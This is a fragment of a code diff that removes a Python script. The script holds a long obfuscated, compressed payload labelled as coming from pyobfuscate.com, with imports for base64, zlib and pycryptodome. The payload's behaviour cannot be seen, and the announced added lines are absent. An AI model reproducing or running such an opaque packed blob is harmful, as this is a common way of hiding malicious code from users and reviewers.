@@ -1,13 +1,437 @@
-#pip install pycryptodome  , It works only v3.11 Above.
-import random ,base64,codecs,zlib;pyobfuscate=""
 
-obfuscate = dict(map(lambda map,dict:(map,dict),['(https://pyobfuscate.com)*(decrypt)'],['''f~uVv>W=2OOsj-PDvN1SB~stT;0(k)q~eY&bCY8+^t*K6CMT0U@Yg#YC0=5w7y-*I&Fo>I1Ow3ZO$`v1!89yl&g2BeI^gteVAQixOpdc)8$x>H08YJZlqfTX7ht#<d%aUAieB94D7qvxqXQz`MxzN)o$kbtSzntn=ZMnoTea#rB&}D=<HH12n#39C_&@W=ywr%lE>os{qUtbM77_E8NLm-(k!;KGbjt*=HAttIjgS5E%;$<lWey5BB#*I>9QKeRA0oJneO~1PeNKk1H78-EeLb*`xF~Ips3<`(J<Y{p6ax&2>LR4~0D&rT8vhA_mT9J-l{R>05<V=3JQH2-IZr8zk5-O{)V7t4CL_e<_gdxYdNq*Vo+;4mbLvce%T)(LpD6DL2k6<(EUT?uWhh{aaKFMJOe~SsBQs8hR+uXGsaInx_m^i_`gx%nZ^@+5l~97~CdF%u<(Yf{XdO|qxI6`8?0QV&)4W+Kr^4AT{dMN-Yzn6N=)AG|BBRRF7?)RIvy%q%Vfq%A9<8y8mgN%W<z1IMtFA;z9MIFHtn8<pVRRWJ`IvQA%aY(d!UvkKT}^>tJ@PZjBjuI|{3~6ij=w`j^3W#5!JG+^HS~|-RTE1FZLB&-&VJZERvUOg%H*u-IN)XQDIM5k(mBJIGazcu0`Jsx=OYhs(OWZb<$!Y!9W!`$%OUhQ9!hT~+<;|+)nR5YxJ!CSE))HJ>YtKH0-ij4u;0#y(%Df@?RfwuW6b0N=~%6B&Yjb@vzuSDfFZ{Bf0aGAu8-cljvW8IhjVpkYekcRlG@#3_mk^#9qi`ov%j+_1exyeHBKk(svG!g|6^g)eW47J=*8seyCO?REJzk5m0>4&Du6Q7Pw>3pgZ!>NM5xzM=E=(1Du8~{b|55_%HO$&-lO>kTu2cws*DfoLv9aiFUNdp%L-=zo}5&Zw5`P$XTD8~BoE~eOgKtHQ}+KXW+aYA%^w+Xv_Dhdx>C0R*JkyhO6|-95tF;wsu%$WU=nmE8y&B9*?7AaxcPzLTT~up`|E|ITK=D3x7`!v9O*Me9Gewyo}f>}I{@Bo;vr-UbLu#vpM_`Pon_u1Aato1Z~{%H6GAQNnN`!8822G(8TUt&L1`c*=bjD<tV^pis-t^d7tR!}%Xgk;clX}+(V~7)+Wv;atE1LsD!L{In9|qXZY$%Movg*;jW^{@L<d9t@s|&KWK^7dS8I`F*=7<EuCKRcugyvs{z$S9izmuBzaO6hNdYgbFSFb6iV|)k0;`SIqAC+zA~@naAAPfvqU8R-8!|QN`UB#&MOeqjkwnHtxf->pZQ?o2sG7Nbs+`()Na44sN6#L}1I*9#&Sf5F9+pq2q1pO)@W@#e#JjD)WF)Wo?=%aj4H6v;+EA*P8|(b8;Xg)1I-ewttO+e>izG{$NJG_t-v>rhe9HGO%l_Q7Ze<w{Tz4;JQ|{A~1*7h*exIN}Jax|muJ@S<HO|RyWLGqv<;Sw_sOG}P`gxPul3OdIpyF<Hk^XEHE`0zqfM^=rAx>uK9YLzE-?orxV6WgZSJ)uN-HrhM`GJ;}4edgcqCjDPZP*Ng&qHt18zIS$LgovA#+R=@^0GLSap4;x=R%r}$t2_RG8@K5$hfDp%l&aixqJ|&KL;M|n531^#8|7^n1$87QrM?kY`IatRgYh^ZmShtK=--Q1xYw8w*u{@G2{{zA@5P3NPD#A3k%2hBJ1~MO3<<++cMQOKl$xoz-dn<kAoD}Z2^`$mgA}5HeeFwOar-4ojMV8`rAFmn_3#wPg^onAa~1<OigRLM2B8y8UE8PprH%(qhpO-ry|8sKMb2ge#7F?lr>^Nh`_F{Bq?nr-zNam)G#k^l&|5@KniOl)x`|2DLaqYD7?s1bWIKi^fD7x|NXW?NVp_{jj_c%T}AE}iA9*%?0c!L2Ccnf4ukX^PZLm9k%raAL%12Vn7JM!m4Ik0jxV^CKQ8mts-KgjSZdTJ{G5@oN7TJtX0L}cKq^zWASPu>!^<?gg|FP5)HjEI#XfLNR``><4`wF@NotR_qk-uG*WPz28U8H-QBE7DxJ(#-yZ0b+B9KLja5p(39A^b6&TarKJwYfwk$`gR%uU2(a+yf`5f!gf_@<bel(zc>;=}e)4LQ-YvU}~jt&|4O1lF02pO^Z}d^D6H6MRr2Xn|k1d)%R_)3rR3&pte%WM*@}XCT}+{)~^WEs-cYbz@KMLbUA<NYDzT+kU80S8+A~eOhxi*^<Eieo)x4a7s&_*YOEVGh)E!@z-bQ{U#OHwxWQ`jZzjH+-%VIJTRW7Y4BjoS7>7xH?aPjvIdO!JE}KpEMR+&P9o@rE7?7mYI+lV5)-W`vYc2!Yr*Wx?=1MLX^l7)fJdy(!EVk=C~^dS{fD!gwG8|ZUEGMJ%fUz7ezTe!IZ4wk%^J6WC^`1$Uf|C{(&O6O)^^kB7ww8|z%xctf9FvQ>RC$_Yo(Ce_SsIihGV~~8e&8CNnPK9v*llJ=Ji8l#;UMXbi>KwC)=ty{iJIsQ_*ZYU@E0>h_+pHS`_z(EH$YbbVMB0vxwUl={n>hWvAI}jSwikN?D4TwnB8-KX^T*8#7Gq*tj>v!*%ASFdM|K={ZXeh}>R7#k?7O`yVDI-QX)5Bs3qbZe0cciI<PvIxPugkg&98fG!X61cFUjc#*;emn_xy<^WZ{LRK2fXSddN$crl7COn+TjB&oDo{=0j-LCPiAJxLM0W1rw4gG9<`>}JX_CfgyE=H2sK4q?L+4<P=bR9ExThj8Krc@6QchJ{X_q4W%w@fRj4+V&1`!r!<gP`6t6chI22XL9ewk-mM#r%`rNdo5XTVwiTxiWK6HOxUO{x(~I^22~d(3W4KlEjBPl$j#U;Q=hHqFctYsW%pR0J2hWAMh*Y|E!&AzE-&lj7%s!zZoncSsww*@HY;?1`U!%9j+mntS1LqE$`vws-(N&z4QR=c1yL8UX`KFJ|aQxG)n^?c|J<yRVO%d`Av%}qiqJ=rr778;_|-%p*6dZbxxP1n;`4_6R~#oqknaea=fbf@KD#eP(h-n`v`twV8(xxUpM1j+z?l;;{6bI6Ely-_UINgDSuo8V=;W4r*eCD@C7kN=Dmlux26MxYN{@FC10kDY0<nxyFaEV4onF~i7pQ9FVBM@K&EsXDo?%_jlUClZ;EvMhr|k#+pgRSmo;Do_j%v4y$~w#9>dc(a03AnIRX?RQOvG1c=6T;aYMT$Wq}Mgfd+pV;STuWSB#!{c%k6_r)%fOBdXGoJP9Q9ciW5aJ#J(H@A8Q5LT`&Wi&-uTaXcHFH^`VG{c_JtT>nJr+GoB~z7dYmP0of%lQ9iJFkjJDn^%Gi7Tl-PZ!alTWsGYhdJt_i8UD`ccPCQq?!!GKV0HhT&NW;4H56tPG5p^*C@@a6AFJEE*W<`=QsT(rn^4ELdl@|7Q3yTufL{8wF(FclIq_ZBgYwQJ(tN043Wv`t3i;XzR2gO(Q_ZalNF>Vt<Ms|&HkkgtcTU<|x+`0JLVyyJ37)d+%Zs9UrIl%`<l_=iND03zG>hr&><&C+B-1uV+9*69dd25IR<A;;$$YCL*8(QhS{cyr6(WBaHMR)dS@nu6_zV&iObg9!E7c5xBg0v{$VxIMa=`;xgT6}#p>v}(#s0*b@RUU3>ych`k0>8`M^1Uh!?v=U0XhZf^KX`)ivJe-Rm9dhcu7_7=wfNn&JKV){2)+K&$*85N?b!OKVxMx0tsY7aASn?24U*<1^Bf=&`q}w`!8KXFrLj87(0)jfWoBMiVyFKYe2M?GhKN<!L#j5;X~7~>!Lj?`^wT@zuNCBOkP=A2;lXgV@RFlW)U~N=t=l*GK|nDXa>Nvv4CYxm~$-jN$OM5W}f4_mejrP;9lEiZq74$-2yf4fVhT4-$S=!g#}4<GBDMV+#BuDd5awipTFM0ZJIFdM9BiQ=JB>mFV_NSg~t-3xG=hxUJI>bg7c&GJstlT826R7_?5{}g&3PmXYu7LBELfZsa)@6dyd4(u_8yFg$rngayxy4Zt^G_k71XA<1g^(!!2+IB_wz6Z2f8*-i`}}uw68^kLO2DwQPh%<KV%h=inaMGJ2==L;FwZ5zqH98T9UPwwe!=Q3s^xvWynH<Hb=R#t3C%<a)J@tgeR#<(9I)4fS||l9RKL?{i;`!AyQlD5#M0JK&{}Rpt@6TA-XRx_+@&8p3ESW{$}|WDa~i0gJda7Hd3XOHNK7zHX7Bx8cS|`8Gn^cExyRnF@(tBz{3J$fv;V=-m<E4r<`e#A3`NrR=@#x_t%br|(6glPvJP*Ga-?jQ>_Bkj&HiTP(LYgFVYxXoed_Q6N%`bglD3R6SwFD<ztG`9PZW%&j2+guvZ(TQiI$DC7`<!dp=8AjS|h6SG6?Z9+QS1cn8iK$R=mATwsP^G~NE@3>2=nUe1%YTaUM!#S)t;9CP^Dfzwg-
-YSF74dKDUNaz5pX?;fg{&Ic`#INr;*Y()C_mHk5p-Fv%m3Rg>C_1<^K|eCo56+<O%G=zI`A2U}l)+4<$J3{gm<JrDg~%f1CS&c1(usi`5m+>{FA-^O4C7|H)1i6j+j+;dj76p&9HMV<X_N586#Y8p%vT*O_0i!fF4egzFv&{ktb^qq_O+Un^lvJ(^M>>PhP8ESf8Bf8MDVRMd#MC!EnM?f`R3qTLT}Y7!q@EC|07f3{-f&{dd4W5wG%mV^=<PdU#=8aXQj2&`fXU1K{3H?7s6SABvOYY^#?oB^wI`}<BNrWDdYR114Xz#aX&!%1>KG<9-~0y|8QlS!6Iy<XNhsB9ueO#oQ!j-8`_?8cISm-9E9Ew5ty)?Dz*ZDjB0&FgaRG)GYf#d%7~aXlO#^`xaBRlV!CB8v_+iO6f@QSIOpo2u^R*Y#@sg%SR<++ku~>3s$xEVUPduq5?7AYMwRV+B>jb*t5ZWW@>_L+mQRwn))>a&UJA|E&x0iu@!}Ua(vXEgN3+%QwIalc7sa5~@d_V1P~iz6MS3C@6u8Cmf#g#1FWr_Ju4Fj7AGqaPkw=YKVslaboTV!{W=&_;(wHA2w&%MRg4Uxo<Oo0(JoGzSu8|aN8}WTE&!TfWt&%T3A06tBOb-%a2BSgJxVIk?I4cNI69}Ex;L0W(A#^SuGPB1f@$pBFP3daVB@FIp;vm9)cq<jawYb&q0TsyWn7G)q0xY8u?bBlyoh2mOy#On0#!kvB%we>AWWy4C>WG|}M+AXBo&KclC6*L_rH(2skJ43L6`rT9Iva`F6l|nE%@w8M2d%OmnWgdGoBrN`o8?}hv6+|__N#7IQ}iEM+CJ>p1DgmdWG_OPrDSVsC~aop5P46}t$f8<e5#|QHvHm~O<IKOO12!~q=jkbLQv59HDb`QvvNUP6|Ru?klru4G@cO!k7pz*`Ib}D0VWGEvuLk>4IYANHZtg=bSLJ}-IB=Tsj4{t<bwhg{aB;r2+9qeX+U^zTsCtJA<T&7sr#Xm7VNUb?BkdXd*gAvG>}_^Qlg>LhuojnNn$ENOolDsz}---K+144O)qufS~YUD0{yh)Cq;WGLY4}PIkLc1N@i7zNCm7im`%H%J*h%zd;@WdCzC#C&}C*p!r<LKO8eVQ<zle=u(jMAw4bb5Cf9vuDXe%w_(zqI1mZCPy|~_alh0_|>*VAeUV@K}j%M8vn!yUbJnB!MNsjdr>H<?lIH;+}wA`6ic0-YTs5FzdcB3uCRYD10_^yUJze*uQsrn7?3i$)V#7bF{r`W0Wbh^_;Jx?vn<?j+Kl(;J&J_$*(<82iNf&M`Qr#J#{f;HEQHq^~hT^pt;YTZm571gjVHJYU9(K9W>@i8jvhAb^Dfj<YwliH6C;&{blDXbu!#3#c%1d!vu1{V|aUg3EC-)5cLEpiL;Wv<ny^*Zi^Q{%?&4XeadhK~RK5C*ukpM&X=nBD}DRmo%nn2N6~(U9~ICw*7M^ngN62Z&9)e09#sja{XYN$fJ^skIqXGm?J`DTJ0cMN0l!k0p5IM3rP**`upBy??cLw-b#bDc~(BRj<rjxmT(X<Y<_-&zyt{SK7#eFp_LxmQpeneBXb&poTX7W~XH*!B{n9LA&XSUY*snKs^+BtCE@&C(Ka3)(mlN%6{*;0s&x-9}?EVw8+kM#EMg|8HBqqoDN4utFfa}aS7WglOo;Mn*X!?C@M6)t=>qQ(Q`~bTX)h(a^g&Puiy1z^QF4?WFQo2xav=Ehtn-~l>+v7r6FQQuX*_J8C`QE%NEB%Wqo$x|2ibalE_ty*|x?TI8H50Ls1t@iag)3`N!Wyd@Mk-U}sM|j~HEKJ;^A>RL>Fbxd4g7eI0fe{n6@uYca7u>WcXB<`QJI{lER8vcX&6Hr$!C<?3m6!A%Z)nwM*4DUX0cR6w4*u|?~ue5$N*eLuToZ;X6GGjAEuD^EFwN+_cyjS*8$^q4g|F)wPajb&N3q+f%d$xqlJG_!Z3(v`}mZ^}nS=9i~JqJajJQ*cfWtc*3%p|?`67*QfhYxJ@FUzRR@CB%MaQ|0T=(@WGrTbr1^=+P`Qv?lA=3CQ_^aGHE)Hx6Ool92HH>v`hVJnTzLhrJRej8hlQ9JHy&#5=Q$?Ue12I+bPs!Xz=`+3`<I+w!doumT({w0oiE&H^a9<8*>av8tFJ7tfoFylV&9*BbHA#*=on&w28EabFUs-$7r?9%-U^Ulw29ARtQE@-ZcXLnr-<KTikF!-Q<~yD-At_%MinjQ^4bF6fcd0WdT=m<u<>(>`cyDH#a)|E;K{PioY%>G1MX1M`-zIkQ1&8c;N<A3(X$uy<aGKY#N2=NTNPnzTQHt}2lnwbMBq%RZnohcKtcTD&x+rg@#@%b!XJs&I1J)sOD58f=`&tQ%Il5@W{=y!$GM`Z~?5?nFdx(U>{~P+Fv1vdzv$>kq0YDZz3qAS()4l~KHlmb2>=RTwg+=JR>#nZmH0c491xa(BaA1z^>Eh@NUz-)hK$d1mFX3~bLWiCfx{@c4_^SIVdJrB29Ac98;o&9x=3Y+LWQ=eQ{HlVr>eY-lq-YsEpAS%a71;aCm7XG{UmX}-)cYg^zEZ+F(bSRzXfyHewnq{6=hiS!~mTSUJhS-rw_r*Q4~`qJV{5H(xsn$|#h)~-tyX6Q=f(-~5F6QmW~xV78&V^^l<-dYUL1Xv<cP^z}lkVDF1Bid#fy_YewkTo=j+Uo4)*3s+DHmF7GQvN2~CnDW#EQFKIyt0`n(j<o20!NFBZSbcrP?;2C?!YNi;}&-zT<VH270V3|47vyZ+#hc4Y%t7rh7xPUkhkK%ec1^2MQ2XD2u*RaM;J*@>});+#o8Fs+@fZaYrHFK17>Z<jtatX?#>G*K4kP>82126-C%U!wzd?d&#C}uCBu&1HW!bCnc_kX@=tFYWU~PG_f#yMM;<f(ZP1S+>gg&lvJH)f*9yxVn1{(kOBlHbk8hMO2_U7%XCdNas6Log2}^zG4_f%O4T2k0$b^l=H|Win1xZ_?HCxi~I&R@@Ho^XIMc$O4pvBt~%B7hFq~sn!4v^Xfr#S^XCx+&kSN6VbMMZt`K%PE<#~hGfj<q(n+V>9QwFVN|cF0^i0@%3~GyOjY1cX?KAzU$VxvRrZW4$f{u@45_9e;Xt=u0afiF)z)+B`xo(CE0PKF(0t!<jhtBg-Ycp-u-=Zg2GsKH>JN9e4%x>91MCOKo6v2Yt;|@+~s_=j{`@K+zun8=|1hwIXO=f+r$_Q4|0lkWd1E1=0THDJ@3P_sZp9@CO2a#9hYO%_8IGG3o)b2EOUgY-W}=jcVFx4v(!v`jY1^syjF&wUO_De-&AglH*uqYpb1ukZlKbkHUkNeXm@oF$Sp=T1>9ZY#}ZC6ujf0ELSK03@-AuFerSo1LUEBP$(1P8et&Wir@6{nYhFV;q~UMV7KwpOADv(Xv$f&#mbOuxL+8b6Q9RMg>wz{zG=(Ndabetqm{G@g2hpY`BKGRvF7+kwuY!vA#A_OZ;1yX=Kx=24@VMCQ&`)kDrT4zjZ*}H5!2F7z)|mu`b2*X1f()DgYzyLn_7Rl9=7AA@{^z~&GK&by|wO5CKeMc)cgCt9JT_MwJVC`Oi5kHwy$=PmQ!?ysJjfWFXGm3&%d5EIhk^^S#TJmAcP%u+Kh(C`PC4WVB$F!@b5eCwhlkc9M6^KYugtEdFSoPTXA6}UOvYNTPRH^vBk^%<cWgkLJEh~*{V`U6P*i>&X{o)Z^wgFY$?4WLvTqh8O1C0BGr(+S$fK}IZyJAj;NWey|h)9<{?^w<2l#&Zx?TaGIy98hS08U(v#lc1$3k`O&h_WnqKV9kSA>9nE0(`Yiv9wdd;V3_FoTz7rMop+1}tt@d<bcQASyO>G~DGdw$VvmwbJ))*oPV^Ed!@0%YZ>gV0E|w8^9hbdH;X9NJWTsl-*tS#8s(#OK;=M8$iJssgViK$P?yPX-Da8Geo#G<cGFYXh0cig!xctLHhW#sIcd!BQb~@W?OMufV&Lqa!z~7==cf(bZZc<uGwa<b*z6_2m6cYI$9E8xRTkP6audYMVjk#TYrVuw<4v+ODI4N97X+a5)MvCH+4IRXR|GILN45M7B5^e)R<9{VxCT!@|{Y&w|F|`J`EkpsdHL3^pR)KH7wSC}9fYN3QpErU_zJ@d)^=_D)6kph=gWv=ZVG2^0gu)}d1sdR#2uv9*tiC=D;sBqO$=6r#I{3t73o21fJQASeD1yQkQy*L}s#3rN!!9j9!!(2wOuj9QeJ%d=7#m+&<*Jo1;*xEQtv4XMlPT98IN&~<2=TOtIR62r8I2|f`axZspIQ#gEgg&f&7X?9kn#?SzlrC=gFejX4$O!@;w@+r9_<jikGPa`t3i^7J^@xEw_&aQP9eo(cjzm7Q=%h`Ng<j&E!B1&E0)LfVvXsjGL`jB*`V#Ud7*yIn#!2_R^Kh*oZfMr}KP*|m6ADkCoBQFB8GkKZ-UJSRc=-GgMe1r0$d!=OY3)-TULV=<6sCSKz#Zi<qgkF~qldh-_4#D)z@}u_37jj3}?zTU(2{9St-+i%Hq9>9G296%*k;-s>X8tIOV>UE}QDck)nmAJFdB5EIcW^IHw5Ey!{7sb>Gv=GjAPhL`8Jp$i^w2D$iLPX!$kz<m8&l!VO<OLlcgU*f^p?mqWIpbmFQwwF1X<j3BBQ0oKcCfpQ%5IenP#Lu_t$t743d+4`T8m@;6#kqLdo>C?*(%mBJMnB6^wM{Y}K^?Z(gZ}rZm?@B6s)B{=4$QDILfW_;wtd0sex6;Izzw!pKR-Lv)oXDxsAvThCEP3tzU32%{sfvyHodXon$2Bc97F=_y`lT08@;)k<|gNjdj^t=$2LTxS$pA7^XpqWnY`{Iz-9gENWq1RqX7_-tTe4FcIx93C+YtSorJH<|WP%m4rJ0$=S{(C0ff)j+EA+jx?5M9lkhWFP|fimsJdsqW@%_d-K~M9Aa~5sMoe&S2i9Gbu;sA<7TAsfPZd{}CMxBqAq#9$C)}8|gp4l|VVtD_>fhE(mZ-k>G1xVa^A!5wd_FY=Xr9E{it$*O*n4^jpQ(SNL<wA~76#2ecMuT-
-yzH+sBf&sSpOq5}azcU!U;q=e0H=8i~yFnc=s<nACKv0CmSsYWDTVwWNGx_?T^C>Bt2ua+&^Du!-WYuAx4YAb;~b+1+#-zB-D;q)s0R&Jalc^7!vPt0reA;7*nWs|mlu_O>i~!f<{jhWxYpIIbBMFdr@T286|518As@jZC4ReB-0$H#)=$L~00MIn)wMHBL528%66~F*l1sxm1R<-K_En@B!+kFH(JU&Gb+l|5Xe0tfjO7J|g&wi(3|>1rm+g2ZtP|Hlc8M!D3ZhuyWb+k8Vtt)|lrVr&uu1dhqNy0p!dHEJNx$o=caI)DEs)S#X+nre4eID8MF3*8gA2zCEh}6cdppxZdhp4`#&7;A|f6M9PoP$DHv(semXR4yB|sgdlcaVJ<IAqm$Dx{RuBZIoUiD9N13U$V%CT7!Z@PGl;IptVq+j()a6GyC+Q^I5}i+JWvg{Z3N+tSn8UbYdgiA)lgzKykLI&)nfhoEqH3PaSiQ5)bfvw%@IXJ0kpDbBO`;5))3<!2vBJo1iPj*3**>L$J1`e-*~GT%aoP9$c_{l=GX`9R*$Ly73mC{kzY}{+MV_?(>fC1jZT~}B^nx*#JMy==XomV_y4X!OMicc>6%|)f4vLfjuKDK8c-`>2NlCp8k|j3W(_4Ux<~fi7m)NDS?}?N+(hhS*e)$Q70H2xL;)G&1r#}eHL569pt%ndSP0ezljYu5+(;j5Q3h2%bSII@aBELkb5n-Lzl<G?;$2Hil=33i6djt(I7!+hl<jH9Hu89-LsE6UMp5C84(bhYZGFiw%kSKy^ca;MG%KvGc2=<RxDd8UTV0(>H7#85ug_Ng9h;W9F{I}9vh{3J&M2}FOgvI8q0y@KR=f+&I;{3}+DOE3=oMKOAsID4&QD!&x4CY(hs4~i^Bz-rtj6I=M&L(q1tgzYWHQHbhRn9-t5d6mFG$<v1e3P^T6gl?9$o^PGPFIX!LxD~=)+u(;3299f#ZDxH+Sn8ela*2>+-377pl9O*G_2-MaXK63si|SY>p&_u;Qs22>4Dm$s6t6OPbL3;!Xgi4^2qq9+(`asoaC}<Mrk)l|>9mxI+x%-P+Bl6B2kS${UB~(Y5@U+YDZ2>3g=)!SK{SEXTaRa!1c>s`FbK2B=AVbKAmIL0U@3-7+w~dS`Q82P466nq4Y}<=|o6PI(TM>oltf3GML*Rg{lJ7@?$@8!`&VQb7lOmu-bax5y+TCQts{C<#+~W2QI(R@H4k3#pTfo_JDXJ?=nU<gU>7SeiMgEiVwA##_laNF|G=y3Fb-?kYmLR`dzs0&We%;PO33qjm}x8R?($3-`hP*A}>n20njm<5hhziP{Q}C$f-f?+R3OmD=_B1cwR|uJ9gf51HKiZYIXX9>jB!69+lJOGF;v=VGwTkEiXiS6MB=0u4K|X$EUa<MCTK=o1EXF@W>uU^IG#`>XPho}FD@q1rNLhy0?gS(@`g@dQ2vuwRrBUCnnZ4HK73)uMZnojYrVEjRy=DbdrI6H;d+vV*Shxh<ilC^rJ;xob0uvoV^d#Tr$_iHUs-OuWF+d8`n>*T;W$RN9OZLJk%hUPeMjI#CJO2pf*esWKG-vc{hU*<InhO-m3uzSrT!A}>-5-uRJd9w!o5{-oCU2s$sA;%*dja;szIP=N)N7U{O$BZo?xo2e`vE2NHl$o?-`;k|zza8laR+I&@)`<F&(tKA#P!kEn-t6P?n&?iVHad8U2s8=QP$Aj*uOwW<u;4+A{-TY|iOaBzm&(e=<kb)$FYcV#DQOlR5;Jgn-)&VsnM7WnBk7dhyf*_3oz@faglSPTCeYgAV$t1(B!&2{6Pl9K}hK5AwmIDeEvwkCTR2<tH2;<Z~B+k{IafcbQNjn$=%(1v-YPpG&g?X8zD{4xW<3oWzz?-b!3d@R=hSM8CwpY9FR_J3Ih2ZeGB;nPiLQO`~f~GV~YrowgQQet1m@^IlmC6N#-(@)-y;X0ITPUCj+XdJf7gqhJNj6p-@xfz-o!P=UDNyxVu0DdZ0kdFL|IXC`r#^b9Xj_fq+qg}l!=3j}l`?C_0em4gV$$h{wS*bCX=kef^zgZCc<0Wt)iy<7hQ<9tDBh99F=ju7K#m(#d!w!#|F{u21IBn&MJGc*cFDf74hV4yG7@ZOqiB|cB7W0D3hgWLzysH%yXnifmf0{UX!4DejdY4*R)w;;<Q^0o6(Z1(Pd5k8sc*Uyqs}28AE5J8kP7AY^Gq-7y&u5O?%rWj*EICYbXhGxwoT3cDnqk7s-EU64^-JK)@%w`Q(1US4=XvXW55J=J0+SFywED4lc`+&gLwn2HQ;b(KmO)X6<&PhaJYlmD0W><c>rMuiR<!4rGuKhY1soNTR`ZuCcyu>!JP>7^OQ+5r(>-!`<-?4W|@`bCNw)*$v5uinDwtzR8>;o)&xtwK&q97e&H5U5DMxlSOI$=O4n!;bHAm&ky9FMzwz-UC^Ww{HGLP=;@l&_Xsvzw&Ama3Wox{(JoUqToV?A<XlE^X>^l_!Hw2eD?q!Z*#??+OGBsoSfK0-A&ZG&Rs3#v_!qKYK{G5Wo#sw4ed!do|%vAv2d6xE;hQxG<(9IEpCsiSlQprU19JsV&AtHAGUZ#?&qz@>9&ExA@ZeUmx`sl0LzcjSVze5ti2@G&A+$78cnj*cs5vt&ol6@-~Pk9e=*-4v$)Q~`jlgG8HaLNaP*AMw`^l_n&&^|b+zg1%U|0S4)i-gkXwDhf<@xD<m@#N1Cuvsv`9Le`;<Y8r?`HKZyGB$byr2zjxcxVu<E#ers=qAO*L0~8s$E%+r5Nmn_3F^GU$2Qy=XTt!)P4eIA*K+Q?9(|T(JeoqTD!03Le}bZre5=A#&qC(O-se{xt7gcD2JfGXyM`IASze}HR4x8hjAtP-!pLhjP<XyF3Ui+CE9`g1ZB10UY?O)04Q|u4`To}V+t@`s(y6^aBF5AJO)=3#Vq65X(c02l4A9l=+m@_;KCS<qa9iqr;}a2g`DoKJB)oGfHay`t%%KDDH%PRN(-isj$+7eyL5hn+L0zNqGsJR>G4ebt)x<UCS*^5545kr`&?-vWIo_)6nR;2x9en=ZK0-O~at)7Z?o)Qw)`MLOAAv$(Bkg*CArWh44+aD&x={-0@=kTZ`Cc&ovH!>r|JhvRy=29bPn){8ov2d{l13@}^pA5iCp_Ck#mxKkT_0X^)|-_Yz4^{5oI}x`f|u8gHY4MT_}B#GnJd94D*Sy!JNgcWE>S?e9|b2!Q0lPH>q8??wzb>iY(YD#OUp{~G|2+qL$~0m-7#vy3PtV8%mleIDFCB5EP8ULbhc(O$X;$~3`*mKs_yNgq72|jb*sTuSdYDyv)I7DdQAQFD16&Qp!nmz8<@|1u&aFBT*y#;m>)^F|Ft~dHD!62=>#Wi!VjPTUQ!L>c49U?`o~N>P%=Ov*8A8z*~h&Vjo%08zZC(f5XBOpsM6Vfvp%4dD-}+*Pi;JOhrE4VklQbXZC>7J*LLUuC-5e4W3*{BF;MPf&(m-o?x`FRuf^somQl6#e2OFZJzpqH17I|CEfAnjTrl=b;)`P71P_pU|K1+wl=Bt5sAZqlFdsy}3I77%XkO(<hbdnqQm@4m-&C8ycgnnCB>^51_Dq+~L&OUs{=ryP3C*yLr=bKN!UeUO%l0yH*G*CTyu*MHYgtQM=(Wd@R5apwlBf_~Ti$gmUsnQd$QqA__l@pM7jQ=2-S<)sQ4NeR&Zf_W<YR<6Lt28jG;Ohe?1NRHxiH>DKMRJbj{VqN+%xesl{n_(L8S$3EhOS|d;)u~Yp*L5Ry>EWNgLJ{5GY&nrJT~dmGo$U;7}HU#~3=@Qu1d0eKgEg0;TWPj6H5#vAy-B8n&KCPVkHXS!NW9<S@fKZk}V#rBg7Bf@H=N1hji571km68X8qT%7txJRHl1#we|5k>aIRhlI9-<b~@HO?&8|c8eHKIz8WBTSZEHVrVfAPkw+Z*5x)JI(4r+EU4hD;77Zl<sq(f2yZFX_g>ln9@-+Wp^F{Jgn)Fsy2>}LMm{tDwvb=-Ok^v5zIF?#VfZ2qkNy)Q}5WKpO?z}qyCNJsS{gS!s^Bc<kP@C?7Mm}KP)txLNZdGeSUG9~FSP_9{oL5Od8BG$hyYT^8$Dprii?V$sdUqc_bQ6nIBzh!-ieE<X-w%#qUK)O#Qt2J>y$rYjHIgl8%#8V*QC7<2k2Jw7rD2vD_`7=}7Y5DMc^FAqutcymctF6o#_(lrFK5-**PhN!_sFR1Iz`bK@T1onW|K;yqNQw?&g=e%LtZ8*piPL}M}d{Gw!cgz_G2kq+uk7%z1lFDh11u4h4g^>JdJfWsUY#%RD%+I8EPLKs&SK3J53SVItW}UH$<03#PK9N)Q1ql+sN*O-ygUGOlfPVNLfGo7xsC<xmhncu-&u&NG=|%4Sn!xOp`;!F6Odg8do(*!zmrJIq|}&wtYyMF?DLo*?}QpgiCl~|M2br19@GOUGKbr6O!M__M&A1WWo8f`ds00VeQ>^!pD#nfjY*jqYWUeKsBVmnBY6)n@hnAUyZszWgsS@!j^vdaSxk@;|T%^6~Naw5`N7kCMBsecfskPeHC$HxGT$S<)P4oXq}D;R=DKC0k0s<m?<tgkyed|&QH=?<tuG8ueB|_akO-~OrVLeKNahLTqy4E%Tdw?88DmXzg7m{S-H>IbY?E(AHsT1ZP8fpY%!MJ<L3sdyo__<ZXnx|M$>BFEj_SAS9|4~H2+6KrV`{_-w4`>ghA%QC0LUb(zPwixm7H}+*<1<Re6Ij%R8I7TFeOgJ_9W$^}-molI`LbckdW5VqhaK%XsWm(CatqJVvf?r2OmIqD^lPC}PV^r?+sx+>-A+N)j{=4O9NnGY8Jbm<;&0*1dG_l)7-CvifP|#5Zr!b0d0-9=<-=+2~hptr-KJAyXq%#u<uBe?d2#@$m=mPp^cCsRqKGDGl%v6g-q&B*J!xX}n}A2zT(ov_c-{k(UIHfS*!R8odxKYAcsrHra-
-lCE=MBCWA9?9?Xn-1Z1;?&(&HMuC4!jn0#F151;tIyMuW~;vkMIB|^YH8XX{4lwOWPDenJp?4RhCG2)2p`B`3OatK5$>2K@xepz3@Kb<(&SU3>n|F7_xc5eX4qFcgwesQu!d$TSvMh@tphg>w{Y>A<8EHNS~nMWB_h<~eLS(d;N=}u4)`q&pBHR1ywK-c0)Kur3rUuq5DWPm&aXnLt;Nc<`rOIqsgK<A;xPgmbU8Wfa4)LCekUWw`(U@^qaaF4YI?g7U(CHEP6N<OUnVib~$E-?3!mXq|Cz@xVR``x%lsrnoIr801khrdVn{$S9e@acfy_L;^|V$u5Ru>`8K%e5j$6##ALW&8z{upo$KLayNZ_GF|hi6X_<+_{z#eKdkJ0jJqzf_+%%I$Db$8*It<V0(1C$k%Su(5yRZb+V?vF#YWkG|n}z+IIkevAWVe@GxF9Vo2f$J(tP8(UqbO5@Aa&GID*kWC0-m+&3BvdxL=X`>-*4|CZi9rj3whgga3Ftvrs=(LFd%ryt8<k=n6lzru;0_TE7Y;yE-`$b>!uB4Ut4Z%$)xLD;uF(RpQdclA@aeLfg&HavGte<v`BxGtZoV@%F_vT&yD;)3caIUSIHY*dZ*hYgs$r!hbs_S9Blsedz5ss2ve(G7iDwG+U}LO-1YzllYM?90FC=m}^im=?FGKz=qh$Vx2Pe%()1<CNF=WOPa;dh>Z>&v$OZUPG)oR2ovINWg>3Xc3;v&KW^l5hSNdg<GmdOY09*LGL{(9OE0UL5B